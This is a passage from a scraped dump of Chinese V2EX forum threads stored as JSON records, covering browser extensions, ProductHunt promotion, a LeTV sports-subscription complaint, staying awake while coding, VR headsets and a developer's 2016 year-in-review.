"Tampermonkey\r", "SimpleExtManager\r", "Stylish\r", "Youtube Plus\r", "ABP （考虑要不要换 uBlock ）\r", "还有一个 ADfree.Player.Online ，这个比较小众，主要用来去视频网站广告的（作者提供的规则是用于 ABP ，捆绑了。。）", " “记住密码也不是难事”\r", "\r", "说明要么不是一号一密要么密码都是一个套路…", " 个人觉得 “一键管理所有扩展”  这个插件还是挺有用的，不需要的时候关掉，需要时候再一键打开，也能很好的抑制 Chrome 内存的消耗，很好的存在。", " \r", "基本都在用，除了 abp 换成 ublock origin ，再加了个 umatrix 。\r", "视频去广告也有脚本版的吧。", "搜索了下，话说 Stylish 这个插件的确是挺好的存在；\r", " #155 supercopy 没搜索到，是哪个 JS"]},
{"content": ["<div class=\"topic_content\">就是我自己。。。好不容易写了一个 Chrome 拓展，然后想着努力在 PH 上混，争取早日成为发布者，然后分享自己的软件。\r<br>\r<br>结果，结果，结果，发现一个热心的网友已经分享了！！！只有 ICON 和一行介绍！关键还搜不到！！！搜不到！！！ PH 上搜不到。。。\r<br>\r<br>我不知道这个网友是帮了我还是坑了我。本来想着 PH 至少能给我来个 1000+PV 吧，毕竟小网站都给了 50+PV ，结果 PH 到现在就给我了不到 15 个 PV 。。。我真的不知道为什么我的拓展明明在 PH 上有了，却在 PH 上搜索不到！非要 Google 才能搜到 PH 上的网页。。。\r<br>\r<br>留下一个笑话给大家。。。\r<br>\r<br><a target=\"_blank\" href=\"https://www.producthunt.com/posts/nooboss\" rel=\"nofollow\">https://www.producthunt.com/posts/nooboss</a>\r<br>\r<br>另外一个拓展还没上 PH ，不知道有没有人想帮助。。。国外一些网站小编自动推荐了，一个网站带来了 200+PV ，简直开心。。。\r<br>想被推荐的拓展在这：\r<br><a target=\"_blank\" href=\"https://ainoob.com/project/noobox\" rel=\"nofollow\">https://ainoob.com/project/noobox</a></div>", "<div class=\"topic_content\">已经有少侠要帮我啦，感谢 V2EX ！\r<br>\r<br>然后就在刚刚一个法国还是哪里的网站推荐二箱，一分钟 8 个 pv ，我天，难道这就是喜悦！？！\r<br>\r<br><a target=\"_blank\" href=\"https://korben.info/extension-chrome-faire-de-recherche-image-meta-moteur.html\" rel=\"nofollow\">https://korben.info/extension-chrome-faire-de-recherche-image-meta-moteur.html</a></div>", "<div class=\"topic_content\">今天简直开心，两个事情\r<br>1.lifehacker 竟然推荐了二管家\r<br><a target=\"_blank\" href=\"http://lifehacker.com/nooboss-restricts-chrome-extensions-to-select-sites-and-1791965108\" rel=\"nofollow\">http://lifehacker.com/nooboss-restricts-chrome-extensions-to-select-sites-and-1791965108</a>\r<br>lifehacker 是什么？一个月 PV69.1 百万的网站，而且这个文章在首页可以看到\r<br>\r<br>二箱这边，那个法国的网站到目前带来了超过 600 用户（感觉可能报少了）\r<br><a target=\"_blank\" href=\"https://korben.info/extension-chrome-faire-de-recherche-image-meta-moteur.html\" rel=\"nofollow\">https://korben.info/extension-chrome-faire-de-recherche-image-meta-moteur.html</a>\r<br>法国网站一个月 PV4.1 百万，而且推荐实在最上面，最上面！最最上面！\r<br>\r<br>然后今天全部合起来超过了 1500PV （因为是拓展，所以一次 PV 就是一次安装的机会，可以理解为一个用户）\r<br>超过了 1200 个安装也就是说 80%的安装率！\r<br>当时看到一秒 9 个 pv 的时候简直都要笑晕了，第一次见到\r<br>\r<br>大概就是这样，感兴趣的可以去我的网站看一下这两个拓展和这推荐这两个拓展的所有网站（几乎全部都记录了哟）\r<br>二箱：    <a target=\"_blank\" href=\"https://ainoob.com/project/nooboss\" rel=\"nofollow\">https://ainoob.com/project/nooboss</a>\r<br>二管家： <a target=\"_blank\" href=\"https://ainoob.com/project/noobox\" rel=\"nofollow\">https://ainoob.com/project/noobox</a></div>"], "reply": "58", "tittle": "当你疯狂的给自己的软件做宣传时，结果发现已经有人帮你提交了一个超级简单潦草的介绍到 ProductHunt 的时候，你什么感觉", "comment": ["心疼楼主。。", " 不是很清楚 PH 能不能二次提交。。。估计是没戏了。而且我申请 maker ，那个网友还不接受。。。蓝瘦想哭", " 摸摸。。", "厉害了", "做 chrome 扩展可以盈利吗？", " 没看明白 那人怎么会有你的东西的？", "2333 心疼楼主\r", "学到了，以后想要搞谁，直接给他提交上去，然后不让作者改！", "联系一下他呗", "早说，我就直接帮你发了，但是 ph 实际也不太好发吧", " 可以，不过我的这两个免费开源，所以并没有准备赚钱", " 直接放个链接就可以了。。。简直不要太简单， 555", " 说实话。。。我觉得真的是一个把产品宣传扼杀在摇篮的方法，太狠了", " Twitter@了他， PH 上申请了，他就是不理，哎", " 求分享二箱啊少年~ 或者等我几个月后更新一下新功能再分享，我都准备了基本的介绍资料了~", "很久以前也写过 chrome 插件，但是没有申请开发者账号就懒得发布了，更不要说找宣传……", " 好吧，申请开发者就 5 刀，感觉很简单啊。。。", " \r", "\r", "\r", "\r", "我的一点经验\r", "\r", "你以后有需要找我就行了，但是我说了, PH 不是你发了就能上的....", " 之前学生狗申请不了信用卡", " 好吧。。。 40 块钱借一下父母的呀，回头换掉就好了。", " 好呀好呀。\r", "不过 PH 是别人自动帮我发的，我不知道那个算不算发布了，因为有了网址，但是就是在 PH 里面搜索不到（没有入口）\r", "\r", "可以的话，少年有没有兴趣看看我的另一个拓展 二箱 (NooBox)？", " 你可以把想写的内容都写好，然后准备发的时间告诉我等等。", " OK! 大概 5 个小时候给你~~~ 超级谢谢！", " 又看了一下 PH ，已经准备好了！\r", "\r", "再次谢谢啊，你那几篇回复和文章我之前就看到了，的确有帮助~", " 我可以直接帮你发，但是你要想明白\r", "1. 发的时间。你想想，你投 MindStore 和 NEXT ，一般是选什么时间？一个道理\r", "2. 有没有足够的人帮你 Follow up? 就是一开始如果就是我投，你 Upvote 一下，那么很难进入 Popular 列表。\r", "3. 我建议最开始不要投 PH ，国外的话，先投 Reddit. 比如 reddit 的 chrome 相关等等，然后找到一些自然粉，在后来投 PH 的时候，让他们来 Upvote", " 好吧，其实拓展已经一段时间了， reddit 上也发了好几次了，不过感觉并没有什么粉丝。我等 PH 上线了试试能不能拉过来一点。话说 hacker news 可以发 PH 的链接吗？感觉那样可能能拉过来点人。\r", "\r", "如果可以的话，可以在 Feb 7, 2017 PST 1:00AM 发吗？不是很清楚你的时区，周二什么时候我都觉得很好~\r", "\r", "我的 PH ", " producthunt 上怎么发呢？ 我刚注册了下，它说需要被邀请后，才有权限发？", " 你 reddit 的链接？我看看你发的是什么样的东西", " 说来惭愧：\r", "\r", "\r", "二箱一般都能有些 upVote ，但是很少有评论的人，二管家就需要的人很少了~", " 然后我的网站上有几乎所有推荐二箱的网站的链接\r", " 很多事情都没做好啊\r", "比如说，你发 Github 的链接，但是下面什么都没写\r", "\r", "看我的...\r", "\r", "\r", "有没有发现区别....", " 好吧，的确下面评论会更好，我是在 Chrome 那里发，在 Open source 那里发，在 side project 那里发，强行广告。。", " ...不，我是说的你 github 上 readme 里什么都没写，那是不是看的人很难知道这是什么东西？比较一下我的呢", " 哦哦，这个有道理，之前一直想着怎么实现，甚至连 comment 都没有做。回头慢慢增加 readme~", " 你可以先拿这些小的练手， reddit, hacker news, PH 依次发过去，慢慢结实用户\r", "等你手上有 10 个可以联系到的用户，愿意帮你投 PH 的时候，就可以去投 PH 了. 那个时候再来找我发 PH.....", " 好吧，我感觉可以在发到 PH 的时候更新一下拓展，现在已经 2000+ Webstore 的用户了，所以感觉应该可以拉些投票。你说的可以联系到的用户，我不知道怎么定义。。。", " 假设我们现在发到了 ph, 或者任何网站，然后现在要拉票造势，防止被埋在底下，你去哪里找到这些人帮你投票？", " 更新版本，提示在 PH 上线，然后求拉票。（通过 Chrome Web Store 更新，所以大概 1-4 小时后就可以覆盖全部从 Chrome Web Store 安装的用户）。 然后在贴吧发帖，在 QQ 群里求助，在 Reddit 上发帖，在 Hacker news 上发帖，在卡饭茶舍发帖。", "做了 5 年网站 居然看不懂楼主在说啥.... 😲", "歪个楼，@cqcn1991 求个 pmcaff 的邀请吗 谢谢\r", "sobigfish 反 spam  ", " 刚登上去看了下，发现账号被屏蔽了\r", "不过也无所谓，我从来不看 PMCAFF...", "-.- 好吧， PMCAFF 居然还屏蔽账号", " 这个随便你了...反正是你的产品....我只是说你应该有一个 strategy ，就像我在豆瓣上写的一样\r", "那换算到北京时间是早上 2 月 6 日，下午 5 点钟?", "昨天看到这贴，然后看到好像小众软件分享了。", " 是的~~~开心。能被小众软件分享简直不要太开心（虽然不拿这个赚钱，但是可以赚面子呀~~~）\r", "\r", "之前一些国外分享网站也分享了，现在就等楼上的大大回头在 PH 上分享了~", " 是的是的，到时候你发出来我就更新拓展，在每一个搜索页面都放一个拉票的消息，然后就开始宣传～", " ProductHunt 是一个产品分享的网站，在国外超级流行，一部分用户可以推荐分享产品。我的一个产品被分享了，但是没有列入网站页面（可以从网址进去，但是其他地方找不到）。所以我不太开心，感觉是那个推荐人没有好好发图片的锅~", "你这还好吧，，，我之前 github 开源的东西 ，，别人直接换个名字，提交到 apple store 。。", " 那的确有点惨，不过开源本来就是可以这样的，所以，还是有点惨。。。", " 既然开源出来了，人家没违反开源协议，有啥啊？", " 所以只能说有点惨，开源了的确应该理解开源的含义，不过有的人拿了开源的东西没有注释，就不太好了。估计他遇到的就是后者", "楼主的站点配色有点辣眼睛", " 是的。。。暂时懒得改了，哈哈，回头看看能不能全部弄成 Material Design", " 能给个 ph 的邀请码吗，谢谢。。 twitter: waruqi", " 自己并不是 PH 的 Hunter ，所以应该给不了吧，抱歉", " 哦哦。没关系", "我说怎么看着眼熟 原来在这看到过 ", " 哈哈，是的~ 最近人品不错，不少网站都分享了~", " 少侠你好， PH 的在二箱里的宣传已经做好。等你分享后我就把新的版本弄上线~"]},
{"content": ["<div class=\"topic_content\">因为比较喜欢听詹俊解说英超，买了个乐视超级体育会员……五百多一年那个……\r<br>\r<br>刚开始很 happy ，基本热门场次都很正常\r<br>\r<br>自从某天起，乐视的付费场次不提供直接观看了\r<br>\r<br>送了一年的新英体育会员，首页大幅广告的同时，点进去就提示这个\r<br>\r<br><img src=\"http://ww1.sinaimg.cn/large/6c2ea0fbly1fcerk48m4nj21am0nzwfq.jpg\" class=\"embedded_image\"> \r<br>\r<br>再点跳进了新英体育，进去两个逗逼解说\r<br>\r<br>你不提供了，这也就罢了\r<br>\r<br>就在现在，正在直播切尔西对阵阿森纳的焦点战，不给我看， TV 端显示正在直播，点进去提示无视频直播，可詹俊这时仍然在乐视解说这场比赛\r<br>\r<br>\r<br>\r<br>我这个付了五百多的超级体育会员看不到我想要的詹俊解说的焦点战\r<br>\r<br>然后，群里的一大帮根本一分钱不花的盗版用户在津津有味的看着有着巨大“乐视超级体育会员”水印的 詹俊解说的 1080P 清晰度的英超，还一直截图给我看，赤裸裸的嘲笑我这个花了钱的大傻逼:\r<br>\r<br><img src=\"http://ww1.sinaimg.cn/large/6c2ea0fbly1fcerq7to4xj20kp0buaak.jpg\" class=\"embedded_image\"> \r<br>\r<br>\r<br>去他妈的的乐视，去你妈的乐视超级体育会员</div>"], "reply": "28", "tittle": "继续开启吐槽模式……去 TMD 乐视体育，去 TMD 超级体育会员！", "comment": ["买了两年的爱奇艺 发现自己也是二逼了", "TL;DR\r", "一句话总结：乐视专门给盗版用户 1080P 的直播了比赛\r", "PS ：你可能买了假的会员 doge-。-", "惨的竟然不知道该如何安慰楼主，交着会员的钱，接受盗版的服务吧", " #3 \r", "\r", "关键是那帮看盗版的还不给我盗版地址……", "既然乐视不播了，那些盗版的怎么还有得看？", " 盗版的用户好坏坏的", " 心疼楼主。。。搜 jrs 直播。。。\r", "本来也想开乐视体育会员的，后来有人介绍了这个就没开。。。\r", "然后发现买会员的各种吐槽。。。", "哈哈哈哈哈哈哈，心疼心疼。\r", "不要买任何国内视频平台的增值服务，是乐视给你上的第一节课。", " 我也买了两年还行啊 电影更新勤快", "新英的垃圾解说。。。都无力吐槽", " #11 \r", "别侮辱垃圾了…… 垃圾都比他俩抢", "你可能买了假的会员....\r", "不不不，乐视网可能是假的....", "付费场次的国内互联网直播权只有新英有，新英没有卖给第三方过，乐视只有互联网电视直播权，所以只有超级电视上能看到詹俊解说的付费场次\r", "\r", "btw ，我厂这一役战罢，切尔西的冠军稳了，温老爷子退休吧", "Sopcast 或者 Acestream 啊，高清 Skysport ， NBC ，英文解说", " #14 \r", "我买的时候可不是这样的……\r", "之前可都是随便在乐视体育网站端看的，包括付费场次……\r", "而且，要不是解说问题，我买新英会员好不好，才二百多，乐视会员可是将近 600 ……\r", "\r", "破车稳了，关键是他狗最后能在啥位置", "阿扎尔那球碉堡了", "你可能买了假会员", "楼主前一阵子没关注新闻吗？假药停险些跑路啊，幸亏老家的国资委又续了口。", "你是正版会员的受害者。\r", "说真的，乐视的会员策略就是个脑残的玩意。\r", "在 TV 端看内容，要会员，否则就模糊+广告。\r", "在 PC 端却可以 高清+广告。而且 PC 是没登录，任意看。", "感同身受,给你一个意见,不要在任何非程序员占主体的地方暴露自己是正版用户.\r", "我身为一个资深迅雷 VIP 用户,在 NAP6 的路由器群,为迅雷会员说了几句话,某人论调是迅雷先免费后限速绑架套路. 然后就是炫耀迅雷破解版,最后甩了一个言论,互联网时代,聪明人都用盗版,猪(正版)为聪明人付费.真™的气- -.\r", "\r", "稍微洗个地,TV 端是一个很诡异的地方,极易受官方(X 电)干扰,可能是非抗拒因素.", "哈哈，跟爱奇艺上满屏的“网络大电影”有的一拼", "我是易到去年活动的时候充 1000 块钱送的乐视超级会员。自己的话大概不会买乐视的会员……新英还行啊，金相凯除了偶尔眼瞎以外就是个低配版的詹俊；几个嘉宾除了刘勇略水以外也还行。", "乐视之前转播的体育比赛因为资金没到位差点被人把信号掐了…… 楼上几位说的都挺清楚了，其实我比较希望英超的赛事也被企鹅买断算了，然而后面几年的卖给了 PPTV = =\r", "\r", "他车今年夺冠看来只是提前几轮的问题了，我一个破厂球迷看完有点莫名心酸。教授的性格可能不会继续在这个俱乐部呆下去了。", "乐视会员最好配乐视电视或者乐视手机看。詹俊的解说因为版权问题也只能在乐视电视看", "年前从乐视体育离职......总之确实是坑......", "百度搜 jrs, 第一个结果，盗版", "这场我也是随便找了个网站免费看的。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我能想到的是喝喝红牛或者咖啡？\n还有些啥呢？</p>\n</div></div>"], "reply": "93", "tittle": "各位夜深写程序写嗨了的情况下如何提提神？", "comment": ["睡觉", "网易云音乐", " 在嗨的时候可能不太想睡觉呢，这种状态是比较宝贵的。", "写嗨了我是不困的…", " 嗯，有道理", "故意写个 bug,时刻记得还有一个坑要去填", "写嗨了就不想睡了，如果提神一般我就碳酸饮料吧", " 我指的这种“嗨”更多的是精神上的，如果肉体上略显疲劳该如何是好呢，睡觉确实是一个好方法，但是这种精神状态不是经常有诶", "写嗨了不是该想办法逼自己睡觉么", "看来你这个是假嗨", "讲道理，写 high 了完全睡不着啊。。躺床上脑子里面都是怎么去实现。。。", " 233", "困了累了，逛草榴！", "写 high 了不会想睡觉", " 就服你😂", "关电脑睡觉", "嗨了还会困吗？", "不要渴了才喝；\r", "不要饿了才吃；\r", "不要困了才睡；\r", "不要嗨了、累了还工作——想想那些猝死而英年早逝的人！", "撸一把", "嗨了还需要提神吗", "开双屏，一边看小电影", "坐直挺胸，身体前倾", "拿盘首胜", "听音乐单曲循环", "写嗨了是感觉不到困的。。。\r", "如果困是不想写了= =", " \r", "\r", "关电脑就能睡着说明还没写嗨", "睡觉，不然会猝死的！", "写嗨了是不会困的，直到解决问题，马上能倒头就睡。", "洗热水澡", "《痒》\r", "\r", "而且是上海话翻唱的那个，在 A 站上。\r", "\r", "最近靠它提神效果很不错。就是有点吓人", "写 high 了怎么会困。。。", "看看 happy tree friends", "写嗨了还要提神？", "嗨了我是不困的\r", "困了我就不嗨了", "打一炮就睡着了", "看看房价，瞬间精神倍增！！！", "hi 了怎么会困啊？？？", "1 、 NutroVape 吸入式咖啡因能量棒  ", "\r", "2 、 Nootrobox-SPRINT 提神胶囊： ", "\r", "\r", "第一个亲测还不错，第二个是传说中的电竞兴奋剂没用过可以试试", "说实在的，写 high 了，你会发现天很快就亮了，而你没有任何感觉。", "小时候打红警小伙伴单曲循环 she 的波斯猫，之后一听到那调调就嗨，感谢网易云给下架了", "写嗨了为何还要提神", " 哈哈哈哈哈哈", " 加一", "很羨慕能嗨的朋友", "洗白白，泡茶！", "写嗨了是一种错觉", "哈哈哈\r", "现在这个夜是这么美", "哈哈，维他柠檬茶", "写嗨了 提提神？这语法还是洗洗睡吧 :)", "都已经嗨了还需要提神？", "以前郭德纲，现在苗阜", "写嗨了，根本不用方法提神，只需要用方法提示自己喝水，喝水，喝水。", "写嗨了都是一直提醒自己要睡了要睡了。。", " 逛完就睡了", "以前喝过一次力保健，当晚想睡都睡不着，硬闭上眼睛都感到眼球乱转。 PS ：去了一趟日本发现日本上班族好需要功能饮料啊，便利店里全都是。", "嗨了根本不需要提神，吃几片安眠药或者喝点酒才能正常。\r", "晚上，一旦困了就赶紧睡觉！身体是自己的", "你都 hi 了还提神什么", "泡茶。", "！！！！！强烈推荐使用这个！！！！！\r", "\r", "   ", "\r", "\r", "！！！！！强烈推荐使用这个！！！！！", "嗨了根本不需要提神", "写嗨了根本不需要提神 每敲的每一行代码都是提神醒脑良品", "写嗨了就不困了\r", "应该问写嗨代码，天亮之后怎么办……", " #59 哈哈哈，点开看了一会觉得好高兴", "睡觉", "有没有写过 android app", "风油精， 别问为什么", "写嗨了一般都是想着法才能睡着，怎么会困呢", " \r", " 提神效果极好", "用冷水洗洗头,洗洗脸.继续.", "翻翻硬盘里的女朋友 整理一下 然后美美的撸一管", "估计你是自嗨...真嗨了压根不用提神", "除非你嗨了三天三夜，不然肉体不至于需要你提神……", "写 high 了一抬头天就亮了", "莫达非尼", "写嗨了唯一的问题是第二天要不要上班。。。根本不觉得困啊", "写嗨了我是不困的…", "深夜写 hi 了还会想睡觉么..", "写嗨了还困说明还不够嗨啊", "写 hi 了还用提神么？ 我都是第二天咖啡保平安啊", "极乐净土", "写嗨了一般面临的问题是躺下了之后还睡不着", "都写嗨了，那还用提升哈。。想提神 就写几行代码。。想睡觉。就看几页书。", "嗨了怎么还需要提神？", "都写嗨了，怎么还需要提神呢？", "写嗨了还需要提神?", "网易云音乐", "我白天才需要提神", "没有什么是撸一血不能搞定的，如果有，那就继续撸一管", "工作是老板的，命是自己的", "写嗨了就继续嗨啊，直到停不下来", "我的效果从低到高依次是：", "咖啡", "可口可乐", "烟", "咖啡，咖啡，咖啡，咖啡"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Hololens 体验怎么样？</p>\n</div></div>"], "reply": "11", "tittle": "想入手一个 VR 眼镜或者 VR 一体机，求良心推荐，求不坑！", "comment": ["你是玩游戏还是干嘛", "Hololens 是 MR ，你走错路了", " 玩游戏，还有你懂的", "Vive 或者 Oculus CV1 啊", "如果只是体验一下，刚巧又有小米手机，推荐小米 VR 专业版。如果钱多不在乎，可以试试 5-6000 的 HTC Vive ， Oculus 就不推荐了，没准哪天就不存在了", "如果是想玩色情游戏那除了 vive 就真没啥可以推荐的了。不过贵，看你是否负担的起了。\r", "\r", "如果是看色情视频那 gear vr 够用了。", "holo lens 现在只有开发版没有消费版，感觉现在谈有点太早了", "对了如果是想玩擦边的游戏的话， ios 平台有一个用纸盒玩的，我看好像挺不错的，忘了叫啥。", "负担的起的话推荐 vive ，目前体验最好的 vr 。 honey select 你懂的（滑稽", "买得起 Hololens 了。那干嘛不 HTC Vive 和 Oculus Rift 一样来一套。。\r", "\r", "好吧要是想感受一下直接 10 块钱买个 Google 纸盒子淘宝版即可。\r", "再好点国内普通手机盒子\r", "再高一点 Google Daydream 盒子\r", "\r", "再往上就是 HTC Vive 和 Oculus Rift\r", "Vive 的无线模块即将上市，体验会好非常多\r", "\r", "其实我觉得现阶段最大的问题是缺乏大作啊。。买了体验一下就吃灰了。。", "一体推荐 Vive ， Rift 也行\r", "眼镜除了 gear 都不推荐\r", "国产 VR 大多和纸盒子都是一个水平"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>前戏</h2>\n<p>今年，对于我个人而言遭遇了<strong>三个重大</strong>的转折点。</p>\n<blockquote>\n<ul>\n<li>15 年 9 月大三休学创业， 16 年 9 月重新复学大三</li>\n<li>在 2016 年 4 月顺利引进天使轮，公司从厦门集美区搬到了深圳南山区</li>\n<li>16 年底，我们正在准备接入 A 轮</li>\n</ul>\n</blockquote>\n<p>16 年与 15 年相比，总体来说自己还是很满意的，基本都按计划进行。当然，获得了许多的同时也失去了许多，离开了自己曾经最喜欢的团队，失去了一个本可能成为很好的基友。 16 年下半年所过得生活，一切都不敢想象。</p>\n<p>前戏做多了，接下来还是说说 2016 年都干了啥吧。</p>\n<h2>技术的这一年</h2>\n<p>回首自己在 16 年所写的文章，其实就很明确的发现这个「时间轴」就是我 16 年在技能路线上的缩影。</p>\n<p>2016.01.23 ---- <a href=\"http://www.meckodo.com/#%21/article/58861dbc6d67c807096f6c90\" rel=\"nofollow\">终于用 thinkjs 重写了本站</a></p>\n<p>2016.01.30 ---- <a href=\"http://www.meckodo.com/#%21/article/588614c86d67c807096f6c76\" rel=\"nofollow\">WebPack 在多页应用项目中的探索</a></p>\n<p>2016.03.04 ---- <a href=\"http://www.meckodo.com/#%21/article/588614d86d67c807096f6c78\" rel=\"nofollow\">教你如何预判用户手势行为</a></p>\n<p>2016.04.22 ---- <a href=\"http://www.meckodo.com/#%21/article/588614f36d67c807096f6c7a\" rel=\"nofollow\">WebPack 在单页项目中的探索</a></p>\n<p>2016.04.26 ---- <a href=\"http://www.meckodo.com/#%21/article/588615076d67c807096f6c7d\" rel=\"nofollow\">(1/2)Vue 构建单页应用最佳实战</a></p>\n<p>2016.05.23 ---- <a href=\"http://www.meckodo.com/#%21/article/5886151d6d67c807096f6c7f\" rel=\"nofollow\">(2/2)Vue 构建单页应用最佳实战</a></p>\n<p>2016.09.01 ---- <a href=\"http://www.meckodo.com/#%21/article/588615346d67c807096f6c83\" rel=\"nofollow\">Vue 或 React 多页应用脚手架</a></p>\n<p>2016.09.26 ---- <a href=\"http://www.meckodo.com/#%21/article/588615556d67c807096f6c87\" rel=\"nofollow\">为小程序而生的小(jiao)手架</a></p>\n<p>2016.11.28 ---- <a href=\"http://www.meckodo.com/#%21/article/5886156d6d67c807096f6c8a\" rel=\"nofollow\">vue 自定义指令升级 2.0 的坑</a></p>\n<p>2016.11.29 ---- <a href=\"http://www.meckodo.com/#%21/article/5886157b6d67c807096f6c8c\" rel=\"nofollow\">vue2.0 构建单页应用最佳实战</a></p>\n<p>2016.12.12 ---- <a href=\"http://www.meckodo.com/#%21/article/588615896d67c807096f6c8e\" rel=\"nofollow\">推荐五个 Vue2 的免费教程</a></p>\n<p>技术文写得还真是少哈！仅仅 11 篇，质量也略一般。在 9 月我个人也开通了公众号，专门用于撰写非技术文。致力于成为一名「伪作家」* [ 想更多了解我的私生活的可以在我的网站头像那扫二维码关注或者微信搜索公众号:erzhe221 ] *。</p>\n<p>16 年初，我们从 Avalon 全面换到了 Vue1.x 。在 16 年初，那我一直纠结于 React 和 Vue 之间应该选哪位情人的问题。一方面来说， react 有她成熟女性的一面，她更明白如何能让一个男人满足，另一方面来说，正是因为她得成熟使她更难以攻略。而 vue 则是洁白无瑕青春懵懂的乙女，不得不让人日夜幻想她褪去衣裳后的样子。不久前这位少女也突破了 40K star 的大关，成为了上升趋势最凶残的前端框架，看来当初我选择 vue 的这个决定还是蛮正确的。</p>\n<p>15 年底我们仅凭着一个 HTML5 的宣传页让一个产品突然成为爆款。可是那时候正好赶上年假，然而年假后的两周新产品就要上线。对于我们来说仅仅只有两周必须把这个项目做完。在这紧要关头，开发的效率成为了我们的重中之重，然而能快速上手学习成本极低小巧的 vue 成为了首选。</p>\n<pre><code>我相信即使现在应该 90%的网站依旧还是多页为主，我们也不例外。\n</code></pre>\n<p>迫于无奈我们长达半年多都是把<code>vue</code>直接引入页面进行开发的，这和传统<code>jQuery+template</code>再配合<code>gulp</code>构建没有太大的区别。在这半年中，我一直在探索多页应用如何能像<code>SPA</code>那样<code>.vue+ES6</code>开发。就<code>Webpack</code>来说，如果只是学习构建 SPA 项目，那可能你只需要半个小时就能学会，但是构建多页却<strong>异常恶心</strong>。所以我最早产出了<code>Webpack 在多页应用中的探索</code>那篇文章（已废弃），但还是不理想。也尝试了用 entry 读 js 再通过 plugin 自动生成页面的方案，却发现构建速度不理想，几十上百页面就会很慢。我个人还是比较洁癖的， 1s 都不想等待。直到有一天一个灵感使用 Gulp 为主 Webpack 为辅进行构建，实现了.vue+es6 开发多页项目，极大的提升了生产力。</p>\n<p>不难看出我这一年都在置身于研究 Gulp 和 Webpack 这样的<code>基础设施构建</code>。我也因而发现，我更擅长去做<strong>技术调研和基础设施构建</strong>这样的事情以便于提高公司的生产力。</p>\n<p>在 15 年 9 月，我们就已经开始前后端分离。所以在 16 年，我们在项目中做了分离 api 层，基于 Express 做 mock 层，并且尝试把前后端做的更彻底，配合微服务将 Node 在边缘业务中使用。<strong>尽可能的把沟通成本用约定和文档降低</strong>。</p>\n<p>当然我们还有很多尝试，每一个点恐怕都可以写出一篇文章了，再此就不过多赘述。</p>\n<p>在这一年中，我还开源了几个非常不起眼的项目，非常感谢大家的支持。</p>\n<p><img alt=\"github\" src=\"https://user-gold-cdn.xitu.io/2017/2/4/33d79854957cf7021a4dc425dfae2571.png\"></p>\n<p><strong>正是因为你们的陪伴，我才能不断地产出，乐此不疲。十分感谢！</strong></p>\n<h2>创业的这一年</h2>\n<p><strong>项目上：</strong></p>\n<p>两年前 CEO 对我说了一句话，这个项目你来带可以吧？嗯，我当场犹豫了，当着所有人的面犹豫了，恐惧，忧虑，不知所措。我深知自己全方面的不足以至于肯定没法接下带领整个项目的任务。那种无能无力的场景随时都会在心中浮现。</p>\n<p>能从头到尾带一个项目在那时成为了我的一个<strong>小梦想</strong>。</p>\n<p>16 年，我很针对性的打磨了自己的软技能。学习项管，学习如何开会，思考团队配置，学习产品等等等。都是为了有一天自己能独当一面不再有惧怕的感觉。 9 月重新回学校后我发现已经可以做到了，重新寻找团队，重新组织大家，确认产品需求，立项，研发，上线。整套流程可以按照自己的节奏跑完。</p>\n<p><strong>团队上：</strong></p>\n<blockquote>\n<p>一个团队，如果没有自己的个性和信仰，那就找不到它存在的意义。</p>\n</blockquote>\n<p>我曾一直在团队里散播，我们要有 BAT 一样标准。\n我们的信仰，前端组是没有 bug 的代码。\n同时也一直在公司里向别的部门强调，前端组的代码是没有 bug 的。</p>\n<p>我知道这几乎是做不到的事情，但<strong>就为了从外界环境上，从心理上，能给我们塑造更加严格的环境和约束，督促组里的每一个人，认真对待自己的事业和产品</strong></p>\n<p>能组建一支有信仰和个性的团队，一直以来也是我的一个<strong>小梦想</strong>，当然这绝对不仅限于技术团队。只有技术的团队，是发挥不出最大的价值的。</p>\n<h2>学习的这一年</h2>\n<p>可以说 16 年的学习，在上半年 80%的精力，放在了技术上。 20%的精力放在了软技能上。而下半年则相反。这一年在技术方面的学习其实还没有达到自己的理想目标，只能给个 60 分吧，还有许多想尝试做的小项目由于种种没法得以实现。</p>\n<p>我知道大多数公司的前端都只有 1 个或者 2 个人。时常看见大多数人老会抱怨着自己公司的团队不好，自己进步缓慢。我必须严肃地告诉你，这一定是你自己的问题。</p>\n<p>我经历了公司从几个人，变为了十来个人，变为了几十个人。\n我同样也经历了，前端只有 1 个人，到 2 个人，到现在的 4 个人。</p>\n<p>我并不完全认为你在技术上没法进步是由环境所导致。的确这有很大一部分原因。但是，这也不影响你能自己去学习更加优秀的技能应用于实践。哪怕是你的业余项目。</p>\n<blockquote>\n<p>你没法进步真的是团队太差，而不是自己不去改变吗？</p>\n</blockquote>\n<blockquote>\n<p>你没法进步真的是自己学不会，而不是自己没有耐心吗？</p>\n</blockquote>\n<blockquote>\n<p>你没法进步真的是需要一个人带，而不是自己过于怠惰吗？</p>\n</blockquote>\n<blockquote>\n<p>你没法进步真的是看不懂英文文档，而不是连翻译都不用吗？</p>\n</blockquote>\n<p>你没法进步的原因可能非常多，但你是否真正有那么几个深夜，在床上好好的与自己独处，认真的了解自己想要什么，自己欠缺什么，自己该如何努力？</p>\n<h2>无假的这一年</h2>\n<blockquote>\n<p>时间对于年轻的我们来说更是一件无法衡量的奢侈品。</p>\n</blockquote>\n<p>从 15 年开始养成了一个 365 天即工作日的状态，当然在 16 年我也是如此。每当看见身边的同学或者是朋友在那无所事事的玩游戏，我就会替他们倍感焦虑。无法理解他们是怀着怎样的心情浪费着自己的青春。</p>\n<p>在假期中，我可以有更多的私人时间，专注于写作，专注于自己的小项目或者小产品中，专注于学习一个新的框架或写写 demo ，专注于练习基本功造造轮子，专注于反省与思考这一周我都做了什么？这个月我都做了哪些？下个月应该完成什么？如果可能的话，我希望我可以无假到 30 岁， 40 岁， 50 岁。</p>\n<p>在 16 岁， 20 岁， 30 岁。</p>\n<blockquote>\n<p>在这么年轻的时光你有什么资格给自己放假？</p>\n</blockquote>\n<blockquote>\n<p>在这么年轻的时光你凭什么应该给自己放假？</p>\n</blockquote>\n<blockquote>\n<p>在这么年轻的时光你放假不会有强烈的罪恶感吗？</p>\n</blockquote>\n<blockquote>\n<p>在这么年轻的时光同龄人都不敢松懈，你却在给自己放假？</p>\n</blockquote>\n<blockquote>\n<p>在这么年轻的时光比你年长的前辈都在努力，而你却在给自己放假？</p>\n</blockquote>\n<p>你总有给自己放松的借口，我已经学习了 3 个小时了需要 dota 一局，我已经努力工作 5 天了，明天终于周末啦！辛苦工作一年了，春节我要好好休息胖 3 